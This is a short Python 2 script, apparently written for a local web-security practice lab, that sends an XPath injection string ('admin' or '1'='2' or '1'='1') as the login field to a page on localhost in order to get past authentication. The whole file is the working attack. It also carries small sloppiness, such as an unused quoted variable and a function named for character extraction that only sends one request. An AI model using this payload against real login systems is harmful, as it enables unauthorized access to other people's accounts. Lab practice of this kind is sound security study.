import requests
from urllib import quote


def next_char(a):
    login = quote(a)
    payload = {'login': a, 'password': '%61%64%6d%69%6e', 'form': 'submit'}
    response = requests.get('http://localhost/xml/xpath1/index.php', params=payload)
    print response


next_char("admin' or '1'='2' or '1'='1")
